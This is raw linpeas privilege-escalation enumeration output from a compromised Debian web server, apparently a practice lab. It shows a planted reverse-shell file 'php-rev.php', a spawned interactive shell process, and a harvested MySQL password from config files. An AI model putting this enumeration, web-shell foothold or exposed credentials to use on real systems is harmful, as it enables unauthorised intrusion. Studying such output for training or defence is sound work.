   140339      4 -rw-r--r--   1 root     root               224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig
   270226      4 -rw-r--r--   1 root     root               633 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.travis.yml
   138381      0 -rw-r--r--   1 root     root                 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch
    12136      0 -rw-r--r--   1 root     root                 0 Jul 29  2023 /run/network/.ifstate.lock
   260079      0 -rw-------   1 root     root                 0 May 29  2021 /etc/.pwd.lock
   259843      4 -rw-r--r--   1 root     root               220 Apr 18  2019 /etc/skel/.bash_logout

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)
-rwxrwxrwx 1 www-data www-data 134167 Jul 29 06:32 /tmp/linpeas.sh                                                                                             
-rw-r--r-- 1 root root 11996 May 29  2021 /var/backups/apt.extended_states.0

[+] Interesting writable Files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                 
/dev/mqueue                                                                                                                                                    
/dev/mqueue/linpeas.txt
/dev/shm
/run/lock
/run/lock/apache2
/sys/kernel/security/apparmor/.access
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/tmp
/tmp/linpeas.sh
/var/cache/apache2/mod_cache_disk
/var/lib/php/sessions
/var/lib/phpmyadmin
/var/lib/phpmyadmin/tmp
/var/lib/phpmyadmin/tmp/twig
/var/lib/phpmyadmin/tmp/twig/15
/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php
/var/lib/phpmyadmin/tmp/twig/21
/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php
/var/lib/phpmyadmin/tmp/twig/22
/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php
/var/lib/phpmyadmin/tmp/twig/28
/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php
/var/lib/phpmyadmin/tmp/twig/2e
/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php
/var/lib/phpmyadmin/tmp/twig/31
/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php
/var/lib/phpmyadmin/tmp/twig/36
/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php
/var/lib/phpmyadmin/tmp/twig/3b
/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php
/var/lib/phpmyadmin/tmp/twig/41
/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php
/var/lib/phpmyadmin/tmp/twig/42
/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php
/var/lib/phpmyadmin/tmp/twig/43
/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php
/var/lib/phpmyadmin/tmp/twig/4c
/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php
/var/lib/phpmyadmin/tmp/twig/4e
/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php
/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php
/var/lib/phpmyadmin/tmp/twig/4f
/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php
/var/lib/phpmyadmin/tmp/twig/53
/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php
/var/lib/phpmyadmin/tmp/twig/5c
/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php
/var/lib/phpmyadmin/tmp/twig/61
/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php
/var/lib/phpmyadmin/tmp/twig/6b
/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php
/var/lib/phpmyadmin/tmp/twig/6c
/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php
/var/lib/phpmyadmin/tmp/twig/73
/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php
/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php
/var/lib/phpmyadmin/tmp/twig/78
/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php
/var/lib/phpmyadmin/tmp/twig/7d
/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php
/var/lib/phpmyadmin/tmp/twig/7f
/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php
/var/lib/phpmyadmin/tmp/twig/8a
/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php
/var/lib/phpmyadmin/tmp/twig/8b
/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php
/var/lib/phpmyadmin/tmp/twig/96
/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php
/var/lib/phpmyadmin/tmp/twig/97
/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php
/var/lib/phpmyadmin/tmp/twig/99
/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php
/var/lib/phpmyadmin/tmp/twig/9d
/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php
/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php
/var/lib/phpmyadmin/tmp/twig/9e
/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php
/var/lib/phpmyadmin/tmp/twig/a0
/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php
/var/lib/phpmyadmin/tmp/twig/a4
/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php
/var/lib/phpmyadmin/tmp/twig/a7
/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php
/var/lib/phpmyadmin/tmp/twig/ae
/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php
/var/lib/phpmyadmin/tmp/twig/af
/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php
/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php
/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php
/var/lib/phpmyadmin/tmp/twig/b6
/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php
/var/lib/phpmyadmin/tmp/twig/c3
/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php
/var/lib/phpmyadmin/tmp/twig/c5
/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php
/var/lib/phpmyadmin/tmp/twig/c7
/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php
/var/lib/phpmyadmin/tmp/twig/ca
/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php
/var/lib/phpmyadmin/tmp/twig/d6
/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php
/var/lib/phpmyadmin/tmp/twig/dd
/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php
/var/lib/phpmyadmin/tmp/twig/e8
/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php
/var/lib/phpmyadmin/tmp/twig/e9
/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php
/var/lib/phpmyadmin/tmp/twig/f5
/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php
/var/lib/phpmyadmin/tmp/twig/fa
/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php
/var/tmp
/var/www/html/academy
/var/www/html/academy/admin
/var/www/html/academy/admin/assets
/var/www/html/academy/admin/assets/css
/var/www/html/academy/admin/assets/css/bootstrap.css
/var/www/html/academy/admin/assets/css/font-awesome.css
/var/www/html/academy/admin/assets/css/style.css
/var/www/html/academy/admin/assets/fonts
/var/www/html/academy/admin/assets/fonts/FontAwesome.otf
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.svg
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.eot
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.svg
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.ttf
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff2
/var/www/html/academy/admin/assets/img
/var/www/html/academy/admin/assets/js
/var/www/html/academy/admin/assets/js/bootstrap.js
/var/www/html/academy/admin/assets/js/jquery-1.11.1.js
/var/www/html/academy/admin/change-password.php
/var/www/html/academy/admin/check_availability.php
/var/www/html/academy/admin/course.php
/var/www/html/academy/admin/department.php
/var/www/html/academy/admin/edit-course.php
/var/www/html/academy/admin/enroll-history.php
/var/www/html/academy/admin/includes
/var/www/html/academy/admin/includes/config.php
/var/www/html/academy/admin/includes/footer.php
/var/www/html/academy/admin/includes/header.php
/var/www/html/academy/admin/includes/menubar.php
/var/www/html/academy/admin/index.php
/var/www/html/academy/admin/level.php
/var/www/html/academy/admin/logout.php
/var/www/html/academy/admin/manage-students.php
/var/www/html/academy/admin/print.php
/var/www/html/academy/admin/semester.php
/var/www/html/academy/admin/session.php
/var/www/html/academy/admin/student-registration.php
/var/www/html/academy/admin/user-log.php
/var/www/html/academy/assets
/var/www/html/academy/assets/css
/var/www/html/academy/assets/css/bootstrap.css
/var/www/html/academy/assets/css/font-awesome.css
/var/www/html/academy/assets/css/style.css
/var/www/html/academy/assets/fonts
/var/www/html/academy/assets/fonts/FontAwesome.otf
/var/www/html/academy/assets/fonts/fontawesome-webfont.eot
/var/www/html/academy/assets/fonts/fontawesome-webfont.svg
/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.eot
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.svg
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.ttf
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff2
/var/www/html/academy/assets/img
/var/www/html/academy/assets/js
/var/www/html/academy/assets/js/bootstrap.js
/var/www/html/academy/assets/js/jquery-1.11.1.js
/var/www/html/academy/change-password.php
/var/www/html/academy/check_availability.php
/var/www/html/academy/db
/var/www/html/academy/db/onlinecourse.sql
/var/www/html/academy/enroll-history.php
/var/www/html/academy/enroll.php
/var/www/html/academy/includes
/var/www/html/academy/includes/config.php
/var/www/html/academy/includes/footer.php
/var/www/html/academy/includes/header.php
/var/www/html/academy/includes/menubar.php
/var/www/html/academy/index.php
/var/www/html/academy/logout.php
/var/www/html/academy/my-profile.php
/var/www/html/academy/pincode-verification.php
/var/www/html/academy/print.php
/var/www/html/academy/studentphoto
/var/www/html/academy/studentphoto/php-rev.php
/tmp/linpeas.sh
/dev/mqueue/linpeas.txt

[+] Searching passwords in config PHP files
$mysql_password = "My_V3ryS3cur3_P4ss";                                                                                                                        
$mysql_password = "My_V3ryS3cur3_P4ss";

[+] Finding IPs inside logs (limit 100)
     44 /var/log/dpkg.log.1:1.8.2.1                                                                                                                            
     24 /var/log/dpkg.log.1:1.8.2.3
     14 /var/log/dpkg.log.1:1.8.4.3
      9 /var/log/wtmp:192.168.10.31
      7 /var/log/dpkg.log.1:7.43.0.2
      7 /var/log/dpkg.log.1:4.8.6.1
      7 /var/log/dpkg.log.1:1.7.3.2
      7 /var/log/dpkg.log.1:0.5.10.2
      7 /var/log/dpkg.log.1:0.19.8.1
      4 /var/log/installer/status:1.2.3.3
      1 /var/log/lastlog:192.168.10.31

[+] Finding passwords inside logs (limit 100)
/var/log/dpkg.log.1:2021-05-29 17:00:10 install base-passwd:amd64 <none> 3.5.46                                                                                
/var/log/dpkg.log.1:2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:21 install passwd:amd64 <none> 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 <none>
/var/log/dpkg.log.1:2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 <none>
/var/log/dpkg.log.1:2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1
/var/log/installer/status:Description: Set up users and passwords

[+] Finding emails inside logs (limit 100)
      1 /var/log/installer/status:aeb@debian.org                                                                                                               
      1 /var/log/installer/status:anibal@debian.org
      2 /var/log/installer/status:berni@debian.org
     40 /var/log/installer/status:debian-boot@lists.debian.org
     16 /var/log/installer/status:debian-kernel@lists.debian.org
      1 /var/log/installer/status:debian-med-packaging@lists.alioth.debian.org
      1 /var/log/installer/status:debian@jff.email
      1 /var/log/installer/status:djpig@debian.org
      4 /var/log/installer/status:gcs@debian.org
      2 /var/log/installer/status:guillem@debian.org
      1 /var/log/installer/status:guus@debian.org
      1 /var/log/installer/status:linux-xfs@vger.kernel.org
      2 /var/log/installer/status:mmind@debian.org
      1 /var/log/installer/status:open-iscsi@packages.debian.org
      1 /var/log/installer/status:open-isns@packages.debian.org
      1 /var/log/installer/status:packages@release.debian.org
      2 /var/log/installer/status:parted-maintainers@alioth-lists.debian.net
      1 /var/log/installer/status:petere@debian.org
      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org
      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org
      1 /var/log/installer/status:pkg-grub-devel@alioth-lists.debian.net
      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org
      1 /var/log/installer/status:rogershimizu@gmail.com
      2 /var/log/installer/status:team+lvm@tracker.debian.org
      1 /var/log/installer/status:tytso@mit.edu
      1 /var/log/installer/status:wpa@packages.debian.org
      1 /var/log/installer/status:xnox@debian.org

[+] Finding *password* or *credential* files in home
                                                                                                                                                               
[+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2                                                                                             
/var/www/html/academy/admin/assets/js/jquery-1.11.1.js
/var/www/html/academy/admin/change-password.php
/var/www/html/academy/admin/includes/config.php
/var/www/html/academy/admin/index.php
/var/www/html/academy/admin/manage-students.php
/var/www/html/academy/admin/student-registration.php
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/assets/js/jquery-1.11.1.js
/var/www/html/academy/change-password.php
/var/www/html/academy/db/onlinecourse.sql
/var/www/html/academy/includes/config.php
/var/www/html/academy/includes/menubar.php
/var/www/html/academy/index.php
/var/www/html/academy/pincode-verification.php
/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user
/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'.
/etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries
/etc/debconf.conf:Accept-Type: password
/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
/etc/debconf.conf:Name: passwords
/etc/debconf.conf:Reject-Type: password
/etc/debconf.conf:Stack: config, passwords
 linpeas v2.2.7 by carlospolop
                                                                                                                                                               
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:                                                                                                                                                       
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                  
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: academy
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)
[+] /usr/bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)                    
                                                                                                                                                               

====================================( System Information )====================================
[+] Operative system                                                                                                                                           
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                
Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                      
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster

[+] Sudo version
sudo Not Found                                                                                                                                                 
                                                                                                                                                               
[+] PATH
[i] Any writable folder in original PATH? (a new completed path will be exported)                                                                              
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                   
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[+] Date
Sat Jul 29 06:37:17 EDT 2023                                                                                                                                   

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on                                                                                                               
/dev/sda1       6.9G  1.9G  4.7G  29% /
udev            479M     0  479M   0% /dev
tmpfs           494M     0  494M   0% /dev/shm
tmpfs            99M  4.3M   95M   5% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           494M     0  494M   0% /sys/fs/cgroup
tmpfs            99M     0   99M   0% /run/user/0
              total        used        free      shared  buff/cache   available
Mem:        1009960      178916      474532       10816      356512      640884
Swap:        998396           0      998396

[+] Environment
[i] Any private information inside environment variables?                                                                                                      
HISTFILESIZE=0                                                                                                                                                 
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:13967
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=d29a7dcbdfb3443ebe10d76ee30417d9
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
HISTFILE=/dev/null

[+] Looking for Signature verification failed in dmseg
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] selinux enabled? .......... sestatus Not Found
[+] Printer? .......... lpstat Not Found                                                                                                                       
[+] Is this a container? .......... No                                                                                                                         
[+] Is ASLR enabled? .......... Yes                                                                                                                            

=========================================( Devices )==========================================
[+] Any sd* disk in /dev? (limit 20)                                                                                                                           
sda                                                                                                                                                            
sda1
sda2
sda5

[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                                                                                                    
UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                                                  
UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0


====================================( Available Software )====================================
[+] Useful software?                                                                                                                                           
/usr/bin/nc                                                                                                                                                    
/usr/bin/netcat
/usr/bin/nc.traditional
/usr/bin/wget
/usr/bin/ping
/usr/bin/base64
/usr/bin/socat
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/python3.7
/usr/bin/perl
/usr/bin/php

[+] Installed compilers?
Compilers Not Found                                                                                                                                            
                                                                                                                                                               

================================( Processes, Cron & Services )================================
[+] Cleaned processes                                                                                                                                          
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                       
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                       
root         1  0.0  0.9 103796  9972 ?        Ss   05:18   0:01 /sbin/init
root       324  0.0  0.7  40376  7976 ?        Ss   05:18   0:00 /lib/systemd/systemd-journald
root       349  0.0  0.4  21932  4952 ?        Ss   05:18   0:00 /lib/systemd/systemd-udevd
systemd+   434  0.0  0.6  93084  6556 ?        Ssl  05:18   0:00 /lib/systemd/systemd-timesyncd
root       465  0.0  0.2   8504  2736 ?        Ss   05:18   0:00 /usr/sbin/cron -f
root       470  0.0  0.7  19492  7244 ?        Ss   05:18   0:00 /lib/systemd/systemd-logind
message+   472  0.0  0.4   8980  4348 ?        Ss   05:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       473  0.0  0.4 225824  4332 ?        Ssl  05:18   0:00 /usr/sbin/rsyslogd -n -iNONE
root       475  0.0  0.2   6620  2808 ?        Ss   05:18   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       477  0.0  0.3   6924  3376 tty1     Ss   05:18   0:00 /bin/login -p --
root       486  0.0  0.6  15852  6876 ?        Ss   05:18   0:00 /usr/sbin/sshd -D
root       521  0.0  2.2 214992 23008 ?        Ss   05:18   0:00 /usr/sbin/apache2 -k start
mysql      541  0.0  8.9 1274452 90652 ?       Ssl  05:18   0:03 /usr/sbin/mysqld
www-data   544  0.0  1.2 215348 13032 ?        S    05:18   0:00 /usr/sbin/apache2 -k start
root       634  0.0  0.8  21024  8488 ?        Ss   05:18   0:00 /lib/systemd/systemd --user
root       635  0.0  0.2  22832  2264 ?        S    05:18   0:00 (sd-pam)
root       639  0.0  0.4   7652  4444 tty1     S+   05:18   0:00 -bash
root       643  0.0  0.5   9488  5592 ?        Ss   05:18   0:00 dhclient
root      1051  0.0  0.5   9488  5688 ?        Ss   06:07   0:00 dhclient
www-data  1075  0.0  1.2 215340 13024 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1128  0.0  1.6 215340 17168 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1129  0.0  1.9 215460 19852 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1137  0.0  1.9 215460 19540 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1147  0.0  1.9 215460 19652 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1151  0.0  2.3 218640 23700 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1157  0.0  1.2 215348 12772 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1163  0.0  1.2 215340 12756 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1172  0.0  1.9 215576 19836 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1583  0.0  0.0   2388   756 ?        S    06:33   0:00 sh -c uname -a; w; id; /bin/sh -i
www-data  1587  0.0  0.0   2388   752 ?        S    06:33   0:00 /bin/sh -i
www-data  1624  1.0  0.1   2520  1628 ?        S    06:37   0:00 /bin/sh ./linpeas.sh
www-data  1805  0.0  0.2   7640  2728 ?        R    06:37   0:00 ps aux

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                      
 56K -rwxr-xr-x 1 root root  56K Jul 27  2018 /bin/login                                                                                                       
   0 lrwxrwxrwx 1 root root    4 May 29  2021 /bin/sh -> dash
1.5M -rwxr-xr-x 1 root root 1.5M Mar 18  2021 /lib/systemd/systemd
144K -rwxr-xr-x 1 root root 143K Mar 18  2021 /lib/systemd/systemd-journald
228K -rwxr-xr-x 1 root root 227K Mar 18  2021 /lib/systemd/systemd-logind
 56K -rwxr-xr-x 1 root root  55K Mar 18  2021 /lib/systemd/systemd-timesyncd
664K -rwxr-xr-x 1 root root 663K Mar 18  2021 /lib/systemd/systemd-udevd
   0 lrwxrwxrwx 1 root root   20 Mar 18  2021 /sbin/init -> /lib/systemd/systemd
236K -rwxr-xr-x 1 root root 236K Jul  5  2020 /usr/bin/dbus-daemon
672K -rwxr-xr-x 1 root root 672K Aug 25  2020 /usr/sbin/apache2
 56K -rwxr-xr-x 1 root root  55K Oct 11  2019 /usr/sbin/cron
 20M -rwxr-xr-x 1 root root  20M Nov 25  2020 /usr/sbin/mysqld
688K -rwxr-xr-x 1 root root 686K Feb 26  2019 /usr/sbin/rsyslogd
792K -rwxr-xr-x 1 root root 789K Jan 31  2020 /usr/sbin/sshd
164K -rwxr-xr-x 1 root root 161K Mar  6  2019 /usr/sbin/vsftpd

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                                                                 
-rw-r--r-- 1 root root 1077 Jun 16  2021 /etc/crontab                                                                                                          

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rw-r--r--  1 root root  712 Dec 17  2018 php

/etc/cron.daily:
total 40
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2
